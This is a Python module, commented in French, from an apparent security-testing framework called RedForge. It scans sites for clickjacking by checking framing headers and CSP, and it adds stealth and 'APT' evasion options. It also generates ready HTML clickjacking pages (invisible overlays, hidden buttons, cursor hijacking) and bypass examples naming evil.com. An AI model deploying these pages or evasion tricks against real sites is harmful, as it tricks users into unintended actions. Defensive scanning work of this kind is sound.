#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection de clickjacking pour RedForge
Détecte les vulnérabilités de clickjacking et d'UI redressement
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse
import json

@dataclass
class ClickjackingConfig:
    """Configuration avancée pour la détection de clickjacking"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    
    # Comportement
    test_all_pages: bool = False
    deep_scan: bool = False
    test_csp_bypass: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False  # Mode passif sans exploitation
    
    # Analyse
    detect_csp_weaknesses: bool = True
    detect_frame_busting: bool = True
    test_drag_drop: bool = True


class ClickjackingDetector:
    """Détection avancée de vulnérabilités clickjacking"""
    
    def __init__(self, config: Optional[ClickjackingConfig] = None):
        """
        Initialise le détecteur de clickjacking
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or ClickjackingConfig()
        
        # Headers de sécurité
        self.security_headers = [
            'X-Frame-Options',
            'Content-Security-Policy',
            'Frame-Options'
        ]
        
        # Patterns CSP pour frame-ancestors
        self.csp_patterns = {
            'frame-ancestors': r'frame-ancestors\s+([^;]+)',
            'default-src': r'default-src\s+([^;]+)'
        }
        
        # Frame busting patterns
        self.frame_busting_patterns = [
            r'if\s*\(top\s*!=\s*self\)',
            r'if\s*\(parent\.frames\.length\s*>\s*0\)',
            r'top\.location\s*=\s*self\.location',
            r'parent\.location\.replace',
            r'window\.parent\s*!=\s*window',
            r'break out of frame'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.tested_pages = 0
        self.vulnerabilities_found = 0
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de clickjacking
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - test_page: Page spécifique à tester
                - user_agent: User-Agent personnalisé
                - depth: Profondeur de scan
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tested_pages = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test de clickjacking sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Détection passive")
        
        result = {
            "target": target,
            "vulnerable": False,
            "headers": {},
            "csp_analysis": {},
            "severity": None,
            "details": None,
            "proof_of_concept": None,
            "frame_busting_detected": False,
            "bypass_techniques": [],
            "recommendations": []
        }
        
        try:
            # Récupérer les headers avec options furtives
            headers = self._get_stealth_headers(kwargs.get('headers', {}))
            response = requests.get(target, timeout=10, verify=False, headers=headers)
            
            # Analyser les headers de sécurité
            result["headers"] = self._analyze_headers(response)
            
            # Analyser CSP
            if self.config.detect_csp_weaknesses:
                result["csp_analysis"] = self._analyze_csp(response)
            
            # Détecter les frame busting scripts
            if self.config.detect_frame_busting:
                result["frame_busting_detected"], frame_busting_details = self._detect_frame_busting(response)
                if frame_busting_details:
                    result["frame_busting_details"] = frame_busting_details
            
            # Évaluer la vulnérabilité
            vulnerability_assessment = self._assess_vulnerability(response, result["csp_analysis"])
            result.update(vulnerability_assessment)
            
            # Techniques de bypass avancées
            if self.config.test_csp_bypass and result["vulnerable"]:
                result["bypass_techniques"] = self._test_csp_bypass_techniques(target, response)
            
            # Générer une preuve de concept
            if result["vulnerable"] and not self.config.passive_detection:
                result["proof_of_concept"] = self._generate_advanced_poc(target, result)
            
            # Générer recommandations
            result["recommendations"] = self._generate_detailed_recommendations(result)
            
        except Exception as e:
            result["error"] = str(e)
        
        if result["vulnerable"]:
            self.vulnerabilities_found += 1
            print(f"      ✓ Clickjacking possible: {result['details']}")
        else:
            print(f"      ✓ Pas de clickjacking détecté")
        
        result["scan_duration"] = time.time() - self.start_time
        result["pages_tested"] = self.tested_pages
        
        return result
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.deep_scan = kwargs['depth'] == 'full'
        if 'test_all_pages' in kwargs:
            self.config.test_all_pages = kwargs['test_all_pages']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.stealth_headers = True
            self.config.random_user_agents = True
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _analyze_headers(self, response: requests.Response) -> Dict[str, Any]:
        """Analyse les headers de sécurité"""
        headers_analysis = {}
        
        for header in self.security_headers:
            if header in response.headers:
                value = response.headers[header]
                headers_analysis[header] = {
                    "value": value,
                    "secure": self._is_header_secure(header, value)
                }
            else:
                headers_analysis[header] = {
                    "present": False,
                    "secure": False
                }
        
        return headers_analysis
    
    def _is_header_secure(self, header: str, value: str) -> bool:
        """Détermine si un header est sécurisé"""
        if header == 'X-Frame-Options':
            return value.upper() in ['DENY', 'SAMEORIGIN']
        elif header == 'Content-Security-Policy':
            return 'frame-ancestors' in value and ("'none'" in value or "'self'" in value)
        return False
    
    def _analyze_csp(self, response: requests.Response) -> Dict[str, Any]:
        """Analyse la politique CSP"""
        csp_analysis = {
            "present": False,
            "frame_ancestors": None,
            "weaknesses": []
        }
        
        csp_header = response.headers.get('Content-Security-Policy', '')
        if csp_header:
            csp_analysis["present"] = True
            
            # Extraire frame-ancestors
            match = re.search(self.csp_patterns['frame-ancestors'], csp_header, re.IGNORECASE)
            if match:
                frame_ancestors = match.group(1)
                csp_analysis["frame_ancestors"] = frame_ancestors
                
                # Analyser la configuration
                if "'none'" in frame_ancestors:
                    csp_analysis["secure"] = True
                elif "'self'" in frame_ancestors:
                    csp_analysis["secure"] = "partial"
                else:
                    csp_analysis["secure"] = False
                    csp_analysis["weaknesses"].append(f"frame-ancestors permissif: {frame_ancestors}")
            else:
                csp_analysis["weaknesses"].append("Absence de directive frame-ancestors dans CSP")
        
        return csp_analysis
    
    def _detect_frame_busting(self, response: requests.Response) -> Tuple[bool, List[str]]:
        """Détecte les scripts de frame busting"""
        detected = []
        text = response.text.lower()
        
        for pattern in self.frame_busting_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                detected.append(pattern)
        
        return len(detected) > 0, detected
    
    def _assess_vulnerability(self, response: requests.Response, csp_analysis: Dict) -> Dict[str, Any]:
        """Évalue la vulnérabilité au clickjacking"""
        assessment = {
            "vulnerable": False,
            "severity": None,
            "details": None
        }
        
        xframe = response.headers.get('X-Frame-Options')
        csp = response.headers.get('Content-Security-Policy')
        
        # Cas 1: Pas de protection
        if not xframe and not csp:
            assessment["vulnerable"] = True
            assessment["severity"] = "HIGH"
            assessment["details"] = "Absence totale de protections anti-clickjacking"
        
        # Cas 2: X-Frame-Options ALLOWALL
        elif xframe and xframe.upper() == 'ALLOWALL':
            assessment["vulnerable"] = True
            assessment["severity"] = "HIGH"
            assessment["details"] = "X-Frame-Options: ALLOWALL - permet l'encapsulation par tout domaine"
        
        # Cas 3: X-Frame-Options ALLOW-FROM (déprécié)
        elif xframe and xframe.upper().startswith('ALLOW-FROM'):
            assessment["vulnerable"] = True
            assessment["severity"] = "MEDIUM"
            assessment["details"] = f"X-Frame-Options: {xframe} - protection limitée (déprécié)"
        
        # Cas 4: CSP frame-ancestors permissif
        elif csp and not csp_analysis.get('secure', True):
            assessment["vulnerable"] = True
            assessment["severity"] = "MEDIUM"
            assessment["details"] = f"CSP frame-ancestors permissif: {csp_analysis.get('frame_ancestors', 'inconnu')}"
        
        # Cas 5: CSP frame-ancestors partiel
        elif csp_analysis.get('secure') == 'partial':
            assessment["vulnerable"] = True
            assessment["severity"] = "LOW"
            assessment["details"] = "CSP frame-ancestors: 'self' - permet l'encapsulation par le même domaine"
        
        # Cas 6: Protection présente mais contournable
        elif self.config.test_csp_bypass and xframe and xframe.upper() == 'SAMEORIGIN':
            # Vérifier si le site peut être chargé via des techniques de contournement
            assessment["vulnerable"] = False  # Par défaut, considéré sécurisé
            assessment["details"] = "Protection X-Frame-Options: SAMEORIGIN en place"
        
        return assessment
    
    def _test_csp_bypass_techniques(self, target: str, response: requests.Response) -> List[Dict[str, Any]]:
        """Teste les techniques de bypass CSP"""
        bypass_techniques = []
        
        # Technique 1: Utilisation de sous-domaines
        parsed = urlparse(target)
        domain_parts = parsed.netloc.split('.')
        
        if len(domain_parts) > 2:
            bypass_techniques.append({
                "technique": "subdomain_attack",
                "description": "Tenter d'utiliser un sous-domaine contrôlé",
                "example": f"https://evil.{parsed.netloc}"
            })
        
        # Technique 2: Utilisation de redirecteurs
        bypass_techniques.append({
            "technique": "open_redirect",
            "description": "Utiliser un redirecteur ouvert si présent",
            "example": f"{target}/redirect?url=https://evil.com"
        })
        
        # Technique 3: Utilisation de services tiers
        bypass_techniques.append({
            "technique": "third_party_service",
            "description": "Utiliser un service tiers pour encapsuler",
            "example": "https://translate.google.com/translate?sl=auto&tl=en&u=" + target
        })
        
        return bypass_techniques
    
    def _generate_advanced_poc(self, target: str, assessment: Dict) -> str:
        """Génère une preuve de concept avancée"""
        
        poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - RedForge Advanced</title>
    <meta charset="UTF-8">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        
        .container {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            overflow: hidden;
            width: 90%;
            max-width: 1200px;
        }}
        
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }}
        
        .header h1 {{
            margin-bottom: 10px;
        }}
        
        .content {{
            display: flex;
            min-height: 500px;
        }}
        
        .target-section {{
            flex: 2;
            position: relative;
            background: #f7fafc;
            border-right: 1px solid #e2e8f0;
        }}
        
        .target-frame {{
            width: 100%;
            height: 500px;
            border: none;
        }}
        
        .controls {{
            flex: 1;
            padding: 20px;
            background: white;
        }}
        
        .control-group {{
            margin-bottom: 20px;
        }}
        
        .control-group label {{
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #2d3748;
        }}
        
        .control-group input, .control-group select {{
            width: 100%;
            padding: 10px;
            border: 1px solid #cbd5e0;
            border-radius: 5px;
            font-size: 14px;
        }}
        
        .button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            margin-bottom: 10px;
            transition: transform 0.2s;
        }}
        
        .button:hover {{
            transform: translateY(-2px);
        }}
        
        .button:active {{
            transform: translateY(0);
        }}
        
        .info {{
            background: #edf2f7;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 12px;
            color: #4a5568;
        }}
        
        .info h3 {{
            margin-bottom: 10px;
            color: #2d3748;
        }}
        
        .alert {{
            position: fixed;
            top: 20px;
            right: 20px;
            background: #f56565;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }}
        
        .severity {{
            display: inline-block;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
        }}
        
        .severity-high {{
            background: #f56565;
            color: white;
        }}
        
        .severity-medium {{
            background: #ed8936;
            color: white;
        }}
        
        .severity-low {{
            background: #ecc94b;
            color: #744210;
        }}
    </style>
</head>
<body>
    <div class="alert" id="alert">Action exécutée sur le site cible!</div>
    
    <div class="container">
        <div class="header">
            <h1>🎯 Clickjacking Exploitation PoC</h1>
            <p>RedForge Security Testing Framework</p>
            <div class="severity severity-{assessment.get('severity', 'medium').lower()}">
                Vulnérabilité: {assessment.get('severity', 'MÉDIUM')}
            </div>
        </div>
        
        <div class="content">
            <div class="target-section">
                <iframe class="target-frame" id="targetFrame" src="{target}" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>
            </div>
            
            <div class="controls">
                <div class="control-group">
                    <label>Opération à simuler:</label>
                    <select id="operation">
                        <option value="click">Clic sur bouton</option>
                        <option value="form">Soumission formulaire</option>
                        <option value="drag">Glisser-déposer</option>
                    </select>
                </div>
                
                <div class="control-group">
                    <label>Position du curseur:</label>
                    <select id="position">
                        <option value="follow">Suivre la souris</option>
                        <option value="fixed">Position fixe</option>
                        <option value="random">Aléatoire</option>
                    </select>
                </div>
                
                <button class="button" id="exploitBtn">🎯 Déclencher l'exploit</button>
                <button class="button" id="resetBtn">⟳ Réinitialiser</button>
                
                <div class="info">
                    <h3>📋 Informations</h3>
                    <p><strong>Cible:</strong> {target}</p>
                    <p><strong>Type:</strong> {assessment.get('details', 'Clickjacking')}</p>
                    <p><strong>Impact:</strong> Interaction utilisateur malveillante</p>
                    <hr>
                    <p><small>Cette page démontre la faisabilité d'une attaque clickjacking. L'utilisateur pense interagir avec cette interface mais interagit en réalité avec le site cible.</small></p>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let targetFrame = document.getElementById('targetFrame');
        let exploitBtn = document.getElementById('exploitBtn');
        let resetBtn = document.getElementById('resetBtn');
        let operation = document.getElementById('operation');
        let position = document.getElementById('position');
        let alertDiv = document.getElementById('alert');
        
        let overlay = document.createElement('div');
        overlay.style.position = 'absolute';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.zIndex = '10';
        overlay.style.opacity = '0';
        overlay.style.cursor = 'pointer';
        
        let targetSection = document.querySelector('.target-section');
        targetSection.style.position = 'relative';
        targetSection.appendChild(overlay);
        
        function showAlert(message) {{
            alertDiv.textContent = message;
            alertDiv.style.display = 'block';
            setTimeout(() => {{
                alertDiv.style.display = 'none';
            }}, 3000);
        }}
        
        function getTargetCoordinates(e) {{
            let rect = targetFrame.getBoundingClientRect();
            let x = e.clientX - rect.left;
            let y = e.clientY - rect.top;
            
            // Appliquer le mode de position
            if (position.value === 'random') {{
                x = Math.random() * rect.width;
                y = Math.random() * rect.height;
            }} else if (position.value === 'fixed') {{
                x = rect.width / 2;
                y = rect.height / 2;
            }}
            
            return {{x: Math.max(0, Math.min(x, rect.width)), y: Math.max(0, Math.min(y, rect.height))}};
        }}
        
        function executeClick(coords) {{
            // Simuler un clic sur l'iframe
            let clickEvent = new MouseEvent('click', {{
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: coords.x,
                clientY: coords.y
            }});
            targetFrame.dispatchEvent(clickEvent);
            showAlert('Clic exécuté sur la cible!');
        }}
        
        function executeDrag(coords) {{
            // Simuler un drag and drop
            let dragStartEvent = new DragEvent('dragstart', {{
                bubbles: true,
                cancelable: true,
                clientX: coords.x,
                clientY: coords.y
            }});
            targetFrame.dispatchEvent(dragStartEvent);
            showAlert('Drag exécuté sur la cible!');
        }}
        
        function executeForm(coords) {{
            // Simuler la soumission d'un formulaire
            let submitEvent = new Event('submit', {{bubbles: true, cancelable: true}});
            targetFrame.contentDocument?.forms[0]?.dispatchEvent(submitEvent);
            showAlert('Formulaire soumis sur la cible!');
        }}
        
        exploitBtn.addEventListener('click', (e) => {{
            let rect = targetFrame.getBoundingClientRect();
            let coords = {{
                x: rect.left + rect.width / 2,
                y: rect.top + rect.height / 2
            }};
            
            switch(operation.value) {{
                case 'click':
                    executeClick(coords);
                    break;
                case 'form':
                    executeForm(coords);
                    break;
                case 'drag':
                    executeDrag(coords);
                    break;
            }}
        }});
        
        resetBtn.addEventListener('click', () => {{
            targetFrame.src = targetFrame.src;
            showAlert('Frame réinitialisée');
        }});
        
        // Suivre la souris pour positionnement dynamique
        if (position.value === 'follow') {{
            document.addEventListener('mousemove', (e) => {{
                let coords = getTargetCoordinates(e);
                overlay.style.left = coords.x + 'px';
                overlay.style.top = coords.y + 'px';
                overlay.style.width = '100px';
                overlay.style.height = '100px';
            }});
        }}
        
        console.log('Clickjacking PoC chargé - Cible: {target}');
    </script>
</body>
</html>'''
        
        return poc_html
    
    def _generate_detailed_recommendations(self, assessment: Dict) -> List[str]:
        """Génère des recommandations détaillées"""
        recommendations = [
            "Ajouter l'en-tête X-Frame-Options: DENY ou SAMEORIGIN",
            "Configurer CSP avec frame-ancestors 'none' ou 'self'"
        ]
        
        if assessment.get('frame_busting_detected'):
            recommendations.append("Les scripts de frame busting peuvent être contournés - utiliser les en-têtes HTTP")
        
        if assessment.get('csp_analysis', {}).get('weaknesses'):
            recommendations.append("Renforcer la politique CSP avec des directives frame-ancestors strictes")
        
        if assessment.get('severity') == 'HIGH':
            recommendations.append("URGENT: Corriger immédiatement la configuration des en-têtes de sécurité")
        
        recommendations.extend([
            "Utiliser des scripts de brise-cadre (frame busting) comme couche de défense supplémentaire",
            "Éviter d'utiliser X-Frame-Options: ALLOWALL ou ALLOW-FROM",
            "Pour les applications critiques, combiner plusieurs protections (X-Frame-Options + CSP)",
            "Auditer régulièrement la configuration des en-têtes de sécurité"
        ])
        
        return recommendations
    
    def test_clickjacking_scenarios(self, target: str) -> List[Dict[str, Any]]:
        """
        Teste différents scénarios de clickjacking
        
        Args:
            target: URL cible
        """
        scenarios = []
        
        # Scénario 1: iframe transparent
        scenarios.append({
            "name": "iframe transparent",
            "description": "Encapsulation avec iframe transparent",
            "severity": "HIGH",
            "code": f'<iframe src="{target}" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%; z-index:999;"></iframe>'
        })
        
        # Scénario 2: Superposition de boutons
        scenarios.append({
            "name": "Superposition de boutons",
            "description": "Bouton malveillant superposé sur un bouton légitime",
            "severity": "HIGH",
            "code": f'''
            <div style="position:relative; width:500px; height:500px;">
                <button style="position:absolute; top:100px; left:100px; width:200px; height:50px; opacity:0; z-index:1000;">Cliquez ici</button>
                <iframe src="{target}" style="position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
            </div>
            '''
        })
        
        # Scénario 3: Drag and drop
        scenarios.append({
            "name": "Drag and drop",
            "description": "Glisser-déposer pour contourner les protections",
            "severity": "MEDIUM",
            "code": f'''
            <div draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'drag')" style="width:100px; height:100px; background:red; color:white; padding:10px;">
                Faites glisser cet élément
            </div>
            <iframe src="{target}" style="width:100%; height:400px;"></iframe>
            '''
        })
        
        # Scénario 4: Cursor hijacking
        scenarios.append({
            "name": "Cursor hijacking",
            "description": "Détournement du curseur pour interactions forcées",
            "severity": "MEDIUM",
            "code": f'''
            <style>
                .cursor-overlay {{
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    cursor: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="1" height="1"%3E%3C/svg%3E'), auto;
                    z-index: 1000;
                }}
            </style>
            <div class="cursor-overlay"></div>
            <iframe src="{target}" style="width:100%; height:100%;"></iframe>
            '''
        })
        
        return scenarios
    
    def deep_scan_pages(self, base_url: str, discovered_urls: List[str]) -> List[Dict[str, Any]]:
        """
        Scanne en profondeur plusieurs pages du site
        
        Args:
            base_url: URL de base
            discovered_urls: Liste des URLs découvertes
        """
        results = []
        
        for url in discovered_urls[:20]:  # Limiter pour performance
            self.tested_pages += 1
            
            if self.config.random_delays:
                time.sleep(random.uniform(0.5, 2))
            
            result = self.scan(url, apt_mode=self.config.apt_mode)
            results.append(result)
        
        return results
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "pages_tested": self.tested_pages,
            "vulnerabilities_found": self.vulnerabilities_found,
            "vulnerability_rate": (self.vulnerabilities_found / self.tested_pages * 100) if self.tested_pages > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_scan": self.config.deep_scan,
                "test_csp_bypass": self.config.test_csp_bypass
            }
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    detector = ClickjackingDetector()
    result = detector.scan("https://example.com")
    print(f"Clickjacking vulnérable: {result['vulnerable']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = ClickjackingConfig(apt_mode=True, passive_detection=True)
    detector_apt = ClickjackingDetector(config=apt_config)
    result_apt = detector_apt.scan("https://example.com", apt_mode=True)
    print(f"Clickjacking détecté (APT): {result_apt['vulnerable']}")
    
    # Tester les scénarios
    scenarios = detector.test_clickjacking_scenarios("https://example.com")
    print(f"\nScénarios générés: {len(scenarios)}")